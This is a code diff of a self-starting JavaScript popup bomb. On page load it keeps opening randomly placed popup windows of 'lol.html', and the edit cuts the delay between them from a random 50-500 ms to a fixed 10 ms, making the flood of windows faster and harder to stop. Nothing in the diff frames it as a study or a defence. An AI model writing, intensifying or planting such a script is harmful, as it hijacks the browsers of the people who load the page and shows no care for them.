@@ -1,13 +1,12 @@
 function openWindow(url) {
-    var newWin = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=200, height=180, titlebar=no, alwaysRaised=yes');
+    const newWin = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=200, height=180, titlebar=no, alwaysRaised=yes');
 
-    // Move the new window to a random location once
     if (newWin) {
-        var screenWidth = screen.width - 200; // Keep within bounds
-        var screenHeight = screen.height - 180;
+        const screenWidth = screen.width - 200; // Keep within bounds
+        const screenHeight = screen.height - 180;
 
-        var randomX = Math.floor(Math.random() * screenWidth);
-        var randomY = Math.floor(Math.random() * screenHeight);
+        const randomX = Math.floor(Math.random() * screenWidth);
+        const randomY = Math.floor(Math.random() * screenHeight);
 
         newWin.moveTo(randomX, randomY);
     }
@@ -15,17 +14,11 @@ function openWindow(url) {
     return newWin;
 }
 
-// Self-executing function to start immediately
 (function () {
-       const openWithRandomDelay = () => {
+    const openWithFixedDelay = () => {
         openWindow('lol.html');
-        
-        // Random delay between 50 ms and 500 ms
-        const randomDelay = Math.floor(Math.random() * (500 - 50 + 1)) + 50;
-        setTimeout(openWithRandomDelay, randomDelay);
+        setTimeout(openWithFixedDelay, 10); // Fixed delay of 10 ms
     };
     
-    // Initial random delay between 50 ms and 500 ms
-    const initialRandomDelay = Math.floor(Math.random() * (500 - 50 + 1)) + 50;
-    setTimeout(openWithRandomDelay, initialRandomDelay);
+    setTimeout(openWithFixedDelay, 10); // Initial fixed delay of 10 ms
 })();
